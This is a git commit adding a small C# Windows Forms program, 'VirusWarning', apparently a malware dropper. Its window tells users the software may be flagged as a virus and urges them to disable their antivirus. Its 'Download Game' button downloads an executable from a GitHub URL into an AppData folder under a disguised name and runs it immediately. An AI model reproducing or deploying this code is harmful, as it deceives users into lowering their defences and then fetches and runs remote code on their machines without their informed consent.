201ccba96a71388e688062ff2699837bf29a3c3a
TeamSmileSecurity <85845587+TeamSmileSecurity@users.noreply.github.com>
2021-07-21 19:27:15 -0500

    Add files via upload

---
+++ Form1.Designer.cs
@@ -0,0 +1,117 @@
+﻿
+namespace VirusWarning
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.button1 = new System.Windows.Forms.Button();
+            this.DownloadButton = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 48F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.Location = new System.Drawing.Point(65, 9);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(350, 73);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "Notification";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label2.Location = new System.Drawing.Point(8, 95);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(473, 60);
+            this.label2.TabIndex = 1;
+            this.label2.Text = "Due to the fact we are unknown developers\r\n there is a high chance that the progr" +
+    "am will be detected as a virus\r\nyou can disable the antivirus temparlity to fix " +
+    "this";
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.Color.White;
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
+            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button1.ForeColor = System.Drawing.Color.Black;
+            this.button1.Location = new System.Drawing.Point(421, 171);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(64, 43);
+            this.button1.TabIndex = 2;
+            this.button1.Text = "cancel";
+            this.button1.UseVisualStyleBackColor = false;
+            // 
+            // DownloadButton
+            // 
+            this.DownloadButton.BackColor = System.Drawing.Color.White;
+            this.DownloadButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.DownloadButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.DownloadButton.ForeColor = System.Drawing.Color.Black;
+            this.DownloadButton.Location = new System.Drawing.Point(12, 171);
+            this.DownloadButton.Name = "DownloadButton";
+            this.DownloadButton.Size = new System.Drawing.Size(403, 43);
+            this.DownloadButton.TabIndex = 3;
+            this.DownloadButton.Text = "Download Game";
+            this.DownloadButton.UseVisualStyleBackColor = false;
+            this.DownloadButton.Click += new System.EventHandler(this.DownloadButton_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.SystemColors.MenuHighlight;
+            this.ClientSize = new System.Drawing.Size(494, 226);
+            this.Controls.Add(this.DownloadButton);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.ForeColor = System.Drawing.Color.White;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button DownloadButton;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,47 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Net;
+using System.IO;
+namespace VirusWarning
+{
+    public partial class Form1 : Form
+    {
+        string DownloadURL= "https://github.com/TeamSmileSecurity/DWExecutor/blob/main/GameDevSetup.exe?raw=true";
+        string DownloadName = "GameDever";
+
+        string DownloadLocation = ""; //Dont change this
+        string FileLocation = ""; //Dont change this
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            DownloadButton.Focus();
+        }
+
+        private void DownloadButton_Click(object sender, EventArgs e)
+        {
+            string folder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            DownloadLocation = folder.ToString() + "\\" + DownloadName;
+            Directory.CreateDirectory(DownloadLocation);
+            FileLocation = folder.ToString() + "\\" + DownloadName + "\\" + DownloadName + ".exe";
+            MessageBox.Show(DownloadLocation.ToString(), FileLocation.ToString(), 0);
+            
+            using (WebClient wc = new WebClient())
+            {
+                wc.DownloadFile(DownloadURL, FileLocation);
+            }
+
+            System.Diagnostics.Process.Start(FileLocation);
+        }
+    }
+}
